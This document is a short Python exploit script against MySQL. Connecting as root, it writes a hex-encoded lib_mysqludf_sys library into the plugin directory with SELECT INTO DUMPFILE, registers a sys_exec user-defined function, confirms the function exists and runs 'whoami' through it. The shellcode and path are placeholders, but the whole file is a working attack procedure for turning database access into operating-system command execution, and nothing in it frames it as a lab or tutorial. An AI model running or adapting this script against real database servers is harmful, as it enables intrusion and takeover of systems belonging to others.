import sys
import subprocess
import os
import re

# lib_mysqludf_sys.so.hex into shellcode
shellcode = ""
db_password = ""
db_user = "root"
db_host = "127.0.0.1"
db_port = "3306"
plugin_dir = '/home/path/plugin/'
udf_filename = 'udf_audit.so'
udf_outfile = plugin_dir + udf_filename

cmd_base = "mysql -h %s --port=%s -u %s -p'%s'" % (db_host, db_port, db_user, db_password)

print("Trying to create a udf library...")
cmd = cmd_base + ' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile
os.system(cmd)

print("Trying to create sys_exec...")
cmd = cmd_base + ' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename
os.system(cmd)

print("Checking if sys_exec was crated...")
cmd = cmd_base + ' -e "select * from mysql.func where name=\'sys_exec\' \G"'
res = subprocess.check_output(cmd, shell=True)

if res == '':
    print("sys_exec was not found (good luck next time!)")

if res:
    print("sys_exec was found: %s" % res)
    cmd = cmd_base + ' -e "select sys_exec(\'whoami\')"'
    os.system(cmd)
